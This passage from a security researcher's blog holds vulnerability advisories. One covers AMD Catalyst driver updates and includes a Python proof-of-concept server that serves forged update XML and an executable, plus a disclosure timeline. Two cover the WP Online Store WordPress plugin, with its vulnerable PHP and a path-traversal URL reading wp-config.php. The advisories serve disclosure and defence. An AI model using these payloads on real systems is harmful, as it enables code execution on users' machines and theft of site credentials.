class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&lt;/Catalyst-Driver-Files&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-53"><span class="crayon-s">&lt;/list&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-54"><span class="crayon-s">"""</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-55">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-56"><span class="crayon-t">class</span><span class="crayon-h"> </span><span class="crayon-e">ExploitHandler</span><span class="crayon-sy">(</span><span class="crayon-k ">SimpleHTTPServer</span><span class="crayon-sy">.</span><span class="crayon-i">SimpleHTTPRequestHandler</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-57"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">def</span><span class="crayon-h"> </span><span class="crayon-e">do_GET</span><span class="crayon-sy">(</span><span class="crayon-r">self</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-58"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-s">"catalystxml"</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-r">self</span><span class="crayon-sy">.</span><span class="crayon-i">path</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-59"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">self</span><span class="crayon-sy">.</span><span class="crayon-e">send_response</span><span class="crayon-sy">(</span><span class="crayon-cn">200</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-60"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">self</span><span class="crayon-sy">.</span><span class="crayon-e">send_header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-type'</span><span class="crayon-sy">,</span><span class="crayon-s">'text/xml'</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-61"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">self</span><span class="crayon-sy">.</span><span class="crayon-e">end_headers</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-62"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">self</span><span class="crayon-sy">.</span><span class="crayon-v">wfile</span><span class="crayon-sy">.</span><span class="crayon-e">write</span><span class="crayon-sy">(</span><span class="crayon-k ">xml</span><span class="crayon-sy">)</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c987717b098123824722-63"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-64"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">elif</span><span class="crayon-h"> </span><span class="crayon-s">".exe"</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-r">self</span><span class="crayon-sy">.</span><span class="crayon-i">path</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-65"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">self</span><span class="crayon-sy">.</span><span class="crayon-e">send_response</span><span class="crayon-sy">(</span><span class="crayon-cn">200</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-66"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">self</span><span class="crayon-sy">.</span><span class="crayon-e">send_header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-type'</span><span class="crayon-sy">,</span><span class="crayon-s">'application/octet-stream'</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-67"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">self</span><span class="crayon-sy">.</span><span class="crayon-e">end_headers</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-68"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">f</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-k ">open</span><span class="crayon-sy">(</span><span class="crayon-i">r</span><span class="crayon-s">"C:\Windows\System32\calc.exe"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"rb"</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-69"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">self</span><span class="crayon-sy">.</span><span class="crayon-v">wfile</span><span class="crayon-sy">.</span><span class="crayon-e">write</span><span class="crayon-sy">(</span><span class="crayon-v">f</span><span class="crayon-sy">.</span><span class="crayon-e">read</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-70"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">f</span><span class="crayon-sy">.</span><span class="crayon-e">close</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-71"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-72">&nbsp;</div><div class="crayon-line" id="crayon-53c987717b098123824722-73"><span class="crayon-v">httpd</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-k ">SocketServer</span><span class="crayon-sy">.</span><span class="crayon-e">ThreadingTCPServer</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-s">'0.0.0.0'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">80</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">ExploitHandler</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-74"><span class="crayon-v">httpd</span><span class="crayon-sy">.</span><span class="crayon-e">serve_forever</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0127 seconds] -->
<p>By pointing  <a href="http://amd.com/" target="_blank">amd.com</a>, <a href="http://www.amd.com/" target="_blank">www.amd.com</a>, <a href="http://www.ati.com/" target="_blank">www.ati.com</a> and <a href="http://www2.ati.com/" target="_blank">www2.ati.com</a> at this script, you&#8217;ll observe that the Catalyst update feature will prompt you to update the driver, and download and execute calc.exe.</p>
<p><strong>Time table</strong></p>
<p>23.11.2012 &#8211; Sent a request for security contact details<br />
23.11.2012 &#8211; Vendor informs that they will only coordinate issues through their support ticket system<br />
23.11.2012 &#8211; Sent details as per request including proof of concept<br />
26.11.2012 &#8211; Vendor acknowledges receipt of details and request further contact details<br />
29.11.2012 &#8211; Vendor confirms that the team is working with their web team to address the issue<br />
10.12.2012 &#8211; Mail sent asking for a rough timeline<br />
14.12.2012 &#8211; Vendor replies informing that the driver team is still working on the issue, and that their legal team is also involved<br />
19.12.2012 &#8211; Vendor publishes advisory: http://support.amd.com/us/kbarticles/Pages/AMDauto-updatenotification.aspx<br />
17.01.2013 &#8211; Vendor releases AMD Catalyst 13.1, removing the update feature</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/amd/" rel="tag">AMD</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2013/03/17/amd-catalyst-driver-update-vulnerability/#comments" title="Comment on AMD Catalyst driver update vulnerability">2 Comments</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-228 -->

				
					
<article id="post-173" class="post-173 post type-post status-publish format-standard hentry category-advisories tag-lfi tag-wordpress-plugin tag-wp-online-store">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2013/02/18/wordpress-online-store-local-file-inclusion-vulnerability/" title="10:44 am" rel="bookmark" class="entry-date"><time datetime="2013-02-18T10:44:58+00:00" pubdate>February 18, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2013/02/18/wordpress-online-store-local-file-inclusion-vulnerability/" title="Permalink to WordPress Online Store local file inclusion vulnerability" rel="bookmark">WordPress Online Store local file inclusion vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href="http://secunia.com/advisories/50836/">Secunia Advisory SA50836</a></p>
<p><strong>Analysis of vulnerability</strong></p>
<p>The WP Online Store exposes a shortcode for displaying the store, which is declared in <a href="http://plugins.trac.wordpress.org/browser/wp-online-store/trunk/core.php?rev=570208">core.php</a>:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717b8cc017837312" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
/* front end begins here */
function WP_online_store()
{
    //global $currencies,$currency,$messageStack,$tree,$categories_string, $cPath_array;
    //global $request_type, $session_started, $SID;
    if (!isset($_REQUEST['slug'])) {
        include(WP_PLUGIN_DIR.'/'.basename(dirname(__FILE__)).'/index.php');
    }
    if ($_REQUEST['slug']) {
        include(WP_PLUGIN_DIR.'/'.basename(dirname(__FILE__)).'/'.$_REQUEST['slug']);
    }

}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717b8cc017837312-192">192</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b8cc017837312-193">193</div><div class="crayon-num" data-line="crayon-53c987717b8cc017837312-194">194</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b8cc017837312-195">195</div><div class="crayon-num" data-line="crayon-53c987717b8cc017837312-196">196</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b8cc017837312-197">197</div><div class="crayon-num" data-line="crayon-53c987717b8cc017837312-198">198</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b8cc017837312-199">199</div><div class="crayon-num" data-line="crayon-53c987717b8cc017837312-200">200</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b8cc017837312-201">201</div><div class="crayon-num" data-line="crayon-53c987717b8cc017837312-202">202</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b8cc017837312-203">203</div><div class="crayon-num" data-line="crayon-53c987717b8cc017837312-204">204</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717b8cc017837312-192"><span class="crayon-c">/* front end begins here */</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b8cc017837312-193"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">WP_online_store</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c987717b8cc017837312-194"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b8cc017837312-195"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">//global $currencies,$currency,$messageStack,$tree,$categories_string, $cPath_array;</span></div><div class="crayon-line" id="crayon-53c987717b8cc017837312-196"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">//global $request_type, $session_started, $SID;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b8cc017837312-197"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'slug'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987717b8cc017837312-198"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">include</span><span class="crayon-sy">(</span><span class="crayon-v">WP_PLUGIN_DIR</span><span class="crayon-sy">.</span><span class="crayon-s">'/'</span><span class="crayon-sy">.</span><span class="crayon-e">basename</span><span class="crayon-sy">(</span><span class="crayon-e">dirname</span><span class="crayon-sy">(</span><span class="crayon-i">__FILE__</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">'/index.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b8cc017837312-199"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c987717b8cc017837312-200"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'slug'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b8cc017837312-201"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">include</span><span class="crayon-sy">(</span><span class="crayon-v">WP_PLUGIN_DIR</span><span class="crayon-sy">.</span><span class="crayon-s">'/'</span><span class="crayon-sy">.</span><span class="crayon-e">basename</span><span class="crayon-sy">(</span><span class="crayon-e">dirname</span><span class="crayon-sy">(</span><span class="crayon-i">__FILE__</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">'/'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'slug'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717b8cc017837312-202"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b8cc017837312-203">&nbsp;</div><div class="crayon-line" id="crayon-53c987717b8cc017837312-204"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0032 seconds] -->
<p></p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717b8dc604549369" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
add_shortcode('WP_online_store', 'WP_online_store');</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717b8dc604549369-222">222</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717b8dc604549369-222"><span class="crayon-e">add_shortcode</span><span class="crayon-sy">(</span><span class="crayon-s">'WP_online_store'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'WP_online_store'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p>If the &#8220;slug&#8221; request parameter isn&#8217;t defined, it will load the index page of the store. But if it is defined, it will load the relevant page which the user requests. It however does not sanitize that the &#8220;slug&#8221; is a WP Online Store file, which allows for a local file inclusion vulnerability if we create a post/page with the text &#8220;[WP_online_store]&#8220;, and submit a request with the slug set like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717b8e6575271176" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
http://192.168.80.130/wordpress/?slug=../../../wp-config.php</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717b8e6575271176-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717b8e6575271176-1"><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//192.168.80.130/wordpress/?slug=../../../wp-config.php</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0004 seconds] -->
<p>&nbsp;</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/lfi/" rel="tag">LFI</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>, <a href="http://ceriksen.com/tag/wp-online-store/" rel="tag">WP Online Store</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2013/02/18/wordpress-online-store-local-file-inclusion-vulnerability/#comments" title="Comment on WordPress Online Store local file inclusion vulnerability">1 Comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-173 -->

				
					
<article id="post-152" class="post-152 post type-post status-publish format-standard hentry category-advisories tag-file-disclosure tag-wordpress-plugin tag-wp-online-store">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2013/02/18/wordpress-online-store-arbitrary-file-disclosure/" title="10:42 am" rel="bookmark" class="entry-date"><time datetime="2013-02-18T10:42:48+00:00" pubdate>February 18, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2013/02/18/wordpress-online-store-arbitrary-file-disclosure/" title="Permalink to WordPress Online Store arbitrary file disclosure" rel="bookmark">WordPress Online Store arbitrary file disclosure</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href="http://secunia.com/advisories/50836/">Secunia Advisory SA50836</a></p>
<p><strong>Analysis of vulnerability</strong></p>
<p>The plugin hooks two functions as a part of its core functionality in <a href="http://plugins.trac.wordpress.org/browser/wp-online-store/trunk/core.php?rev=570208">core.php</a> by adding an action for init and admin_init.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717c005741037397" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
add_action('init', 'osc_session_init_fend'); // starts session
add_action('admin_init', 'osc_session_init'); // starts session</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717c005741037397-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c005741037397-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717c005741037397-3"><span class="crayon-e">add_action</span><span class="crayon-sy">(</span><span class="crayon-s">'init'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'osc_session_init_fend'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// starts session</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c005741037397-4"><span class="crayon-e">add_action</span><span class="crayon-sy">(</span><span class="crayon-s">'admin_init'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'osc_session_init'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// starts session</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0011 seconds] -->
<p>The first line calls into osc_session_init_fend whenever a WordPress page is loaded, in order to set up a session.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717c014613292215" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function osc_session_init_fend()
{
    session_name('osCsid');
    $request_type = (getenv('HTTPS') == 'on') ? 'SSL' : 'NONSSL';
    if (isset($_POST['osCsid'])) {

        session_id($_POST['osCsid']);

    } else if (($request_type == 'SSL') &amp;&amp; isset($_GET['osCsid']) ) {

        session_id($_GET['osCsid']);

    }
    //if (!session_id())
    session_start();
    ob_start();
    if ($_REQUEST['force']=='downloadnow') {
        header('Content-type: application/x-octet-stream');
        header('Content-disposition: attachment; filename=' . $_REQUEST['file']);

        readfile($_REQUEST['turl'] . $_REQUEST['file']);
        // unlink($_REQUEST['turl'] . $_REQUEST['backup_file']);

    }
    wp_enqueue_script('jquery');
}</textarea></div>
